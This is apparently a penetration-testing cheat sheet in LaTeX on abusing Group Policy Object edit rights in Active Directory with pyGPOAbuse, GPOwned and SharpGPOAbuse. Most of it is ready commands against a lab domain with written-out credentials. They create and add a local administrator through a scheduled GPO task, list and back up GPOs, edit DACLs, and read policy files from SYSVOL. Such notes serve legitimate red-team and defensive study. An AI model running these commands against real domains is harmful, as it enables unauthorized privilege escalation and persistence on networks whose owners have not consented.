
\section{Tools}


\subsection{pyGPOAbuse}
\href{https://github.com/Hackndo/pyGPOAbuse}{pyGPOAbuse} Python partial implementation of SharpGPOAbuse.

\begin{verbatim}
pygpoabuse.py inlanefreight.local/gabriel:Godisgood001 \
    -gpo-id EF1EBF2A-08F2-48E0-9D2E-67D9F2CE875D \
    -command "net user plaintext Password1234 /add && net localgroup Administrators plaintext /add" \
    -taskname "PT_LocalAdmin" -description "this is a GPO test" \
    -dc-ip 172.16.92.10 -v
\end{verbatim}


\subsection{GPOwned}
\href{https://github.com/X-C3LL/GPOwned}{GPOwned}

\begin{verbatim}
GPOwned.py -u gabriel -p Godisgood001 -d inlanefreight.local -dc-ip 172.16.92.10 \
    -gpcmachine -listgpo

GPOwned.py -u gabriel -p Godisgood001 -d inlanefreight.local -dc-ip 172.16.92.10 \
    -gpcmachine -listgplink

dacledit.py inlanefreight.local/gabriel:Godisgood001 \
    -target-dn "CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=inlanefreight,DC=local" \
    -dc-ip 172.16.92.10

GPOwned.py -u gabriel -p Godisgood001 -d inlanefreight.local -dc-ip 172.16.92.10 \
    -gpcmachine -backup backupgpo -name "{31B2F340-016D-11D2-945F-00C04FB984F9}"
\end{verbatim}


\subsection{SharpGPOAbuse}

\href{https://github.com/FSecureLABS/SharpGPOAbuse}{SharpGPOAbuse} is a \verb+.NET+ application written in \verb+C#+ that can be used to take advantage of a user's edit rights on a Group Policy Object (GPO) in order to compromise the objects that are controlled by that GPO

\begin{verbatim}
--AddUserRights 	Add rights to a user
--AddLocalAdmin 	Add a user to the local admins group (Overwrite any existing Administrator)
--AddComputerScript 	Add a new computer startup script
--AddUserScript 	Configure a user logon script
--AddComputerTask 	Configure a computer immediate task
--AddUserTask 	Add an immediate task to a user
\end{verbatim}

\begin{verbatim}
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount gabriel --GPOName "Default Security Policy - WKS"
cat "\\inlanefreight.local\SysVol\inlanefreight.local\Policies\{EF1EBF2A-08F2-48E0-9D2E-67D9F2CE875D}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf"
\end{verbatim}
